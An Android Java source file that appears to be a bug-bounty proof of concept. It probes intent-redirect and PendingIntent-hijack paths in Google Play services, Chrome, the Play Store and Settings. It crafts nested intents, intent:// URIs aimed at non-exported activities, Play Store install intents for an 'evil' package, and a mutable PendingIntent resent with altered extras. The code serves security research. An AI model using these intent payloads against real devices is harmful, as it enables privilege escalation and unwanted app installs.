package com.vrp.poc;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class IntentRedirectPocActivity extends Activity {
    private static final String TAG = "IntentRedirect";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(7);
        logView.setText("Intent Redirect & PendingIntent Hijack PoC\n");
        logView.append("UID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void runTests() {
        testGmsIntentRedirect();
        testChromeIntentScheme();
        testPlayStoreDeepLink();
        testSettingsRedirect();
        testPendingIntentMutation();
        log("\n=== ALL INTENT REDIRECT TESTS COMPLETE ===");
    }

    private void testGmsIntentRedirect() {
        log("=== TEST 1: GMS Activity Intent Redirect ===\n");

        // Test: GMS activities that accept nested intents as extras
        // These can be exploited to launch non-exported activities with GMS privileges

        // 1. AuthorizationActivity with redirect_uri
        try {
            Intent i = new Intent();
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.auth.api.credentials.authorization.ui.AuthorizationActivity"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            i.putExtra("com.google.android.gms.auth.api.credentials.authorization.REDIRECT_URI",
                "intent://settings#Intent;component=com.android.settings/.Settings$DevelopmentSettingsDashboardActivity;end");
            i.putExtra("authorizationRequestUri", "https://accounts.google.com/o/oauth2/auth");
            startActivity(i);
            log("[SENT] AuthorizationActivity with redirect_uri intent://");
        } catch (Exception e) {
            log("[ERROR] AuthUI redirect: " + shorten(e.getMessage(), 80));
        }

        // 2. GMS WebView activities that may process intent:// URIs
        try {
            Intent i = new Intent(Intent.ACTION_VIEW);
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.growth.ui.webview.GrowthWebViewActivity"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            i.setData(Uri.parse("intent://settings#Intent;component=com.android.settings/.Settings;end"));
            startActivity(i);
            log("[SENT] GrowthWebView with intent:// URI");
        } catch (Exception e) {
            log("[ERROR] GrowthWebView: " + shorten(e.getMessage(), 80));
        }

        // 3. GMS FeatureDrops with next_activity extra
        try {
            Intent inner = new Intent();
            inner.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.auth.managed.ui.EmmActivity"));
            inner.putExtra("accountName", "test@evil.com");

            Intent i = new Intent(Intent.ACTION_VIEW);
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.growth.featuredrops.activity.FeatureDropsActivity"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            i.putExtra("android.intent.extra.INTENT", inner);
            i.putExtra("next", inner);
            i.putExtra("next_intent", inner);
            i.putExtra("redirect_intent", inner);
            i.putExtra("result_intent", inner);
            i.putExtra("return_intent", inner);
            i.putExtra("callback_intent", inner);
            startActivity(i);
            log("[SENT] FeatureDrops with nested intent extras");
        } catch (Exception e) {
            log("[ERROR] FeatureDrops: " + shorten(e.getMessage(), 80));
        }

        // 4. AccountTransfer with redirect
        try {
            Intent i = new Intent("com.google.android.gms.auth.START_ACCOUNT_EXPORT");
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.auth.account.transfer.AccountTransferActivity"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            i.putExtra("android.intent.extra.INTENT", new Intent(
                "android.settings.MANAGE_ALL_APPLICATIONS_SETTINGS"));
            startActivity(i);
            log("[SENT] AccountTransfer with nested settings intent");
        } catch (Exception e) {
            log("[ERROR] AccountTransfer: " + shorten(e.getMessage(), 80));
        }
    }

    private void testChromeIntentScheme() {
        log("\n=== TEST 2: Chrome intent:// URI Processing ===\n");

        // Test if Chrome's IntentDispatcher processes intent:// URIs to launch activities
        // This is a well-known attack vector

        // 1. Direct intent:// to Chrome
        try {
            Intent i = new Intent(Intent.ACTION_VIEW);
            i.setData(Uri.parse("intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end"));
            i.addCategory(Intent.CATEGORY_BROWSABLE);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            log("[SENT] Chrome intent:// URI for ZXing");
        } catch (Exception e) {
            log("[ERROR] Chrome intent: " + shorten(e.getMessage(), 80));
        }

        // 2. googlechrome:// scheme
        try {
            Intent i = new Intent(Intent.ACTION_VIEW);
            i.setData(Uri.parse("googlechrome://navigate?url=https%3A%2F%2Fevil.example.com"));
            i.addCategory(Intent.CATEGORY_BROWSABLE);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            log("[SENT] googlechrome:// navigate");
        } catch (Exception e) {
            log("[ERROR] googlechrome: " + shorten(e.getMessage(), 80));
        }

        // 3. intent:// with component to target non-exported Chrome activity
        try {
            Intent i = new Intent(Intent.ACTION_VIEW);
            i.setData(Uri.parse(
                "intent://#Intent;component=com.android.chrome/org.chromium.chrome.browser.settings.SettingsActivity;end"));
            i.addCategory(Intent.CATEGORY_BROWSABLE);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            log("[SENT] intent:// targeting Chrome Settings (non-exported)");
        } catch (Exception e) {
            log("[ERROR] Chrome settings: " + shorten(e.getMessage(), 80));
        }
    }

    private void testPlayStoreDeepLink() {
        log("\n=== TEST 3: Play Store Deep Link Abuse ===\n");

        // Test if we can trigger app installation via Play Store deep link
        try {
            Intent i = new Intent(Intent.ACTION_VIEW);
            i.setData(Uri.parse("market://details?id=com.evil.testapp&referrer=utm_source%3Dattacker"));
            i.setPackage("com.android.vending");
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            log("[SENT] Play Store market:// deep link with referrer");
        } catch (Exception e) {
            log("[ERROR] Play Store: " + shorten(e.getMessage(), 80));
        }

        // Test direct install intent
        try {
            Intent i = new Intent("com.android.vending.INSTALL");
            i.setPackage("com.android.vending");
            i.putExtra("package_name", "com.evil.testapp");
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            log("[SENT] Play Store INSTALL intent");
        } catch (Exception e) {
            log("[ERROR] PlayStore install: " + shorten(e.getMessage(), 80));
        }
    }

    private void testSettingsRedirect() {
        log("\n=== TEST 4: Settings Activity Redirect ===\n");

        // Test if we can reach developer settings or other restricted settings
        // via intent redirect through another app

        // Direct attempt to developer settings
        try {
            Intent i = new Intent("android.settings.APPLICATION_DEVELOPMENT_SETTINGS");
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            log("[SENT] Direct developer settings");
        } catch (Exception e) {
            log("[ERROR] Dev settings direct: " + shorten(e.getMessage(), 80));
        }

        // Via GMS settings search
        try {
            Intent i = new Intent(Intent.ACTION_VIEW);
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.app.settings.GoogleSettingsLink"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            i.setData(Uri.parse("https://www.google.com/settings"));
            startActivity(i);
            log("[SENT] GMS GoogleSettingsLink");
        } catch (Exception e) {
            log("[ERROR] GMS settings link: " + shorten(e.getMessage(), 80));
        }
    }

    private void testPendingIntentMutation() {
        log("\n=== TEST 5: PendingIntent Mutation ===\n");

        // Test: Create a mutable PendingIntent that could be hijacked
        // On Android 17, FLAG_MUTABLE is required for some PendingIntents
        // but PARCEL_HARDENING is gated at SDK 37

        try {
            Intent base = new Intent("com.vrp.poc.TEST_PI");
            base.setPackage(getPackageName());

            // Create mutable PendingIntent
            PendingIntent pi = PendingIntent.getActivity(this, 0, base,
                PendingIntent.FLAG_MUTABLE);
            log("[INFO] Mutable PendingIntent created: " + pi.getCreatorPackage());
            log("[INFO] Creator UID: " + pi.getCreatorUid());

            // Try to send it with modified extras
            Intent modified = new Intent();
            modified.setComponent(new ComponentName("com.android.settings",
                "com.android.settings.Settings"));
            modified.putExtra("show_fragment", "com.android.settings.DevelopmentSettings");

            pi.send(this, 0, modified);
            log("[SENT] Mutable PendingIntent with modified extras");

        } catch (Exception e) {
            log("[INFO] PendingIntent mutation: " + shorten(e.getMessage(), 80));
        }

        // Test: Check if system services return mutable PendingIntents
        try {
            android.app.NotificationManager nm = getSystemService(android.app.NotificationManager.class);
            if (nm != null) {
                log("[INFO] NotificationManager accessible");
            }
        } catch (Exception e) {
            log("NotifMgr: " + shorten(e.getMessage(), 50));
        }
    }

    private String shorten(String s, int max) {
        if (s == null) return "null";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }
}
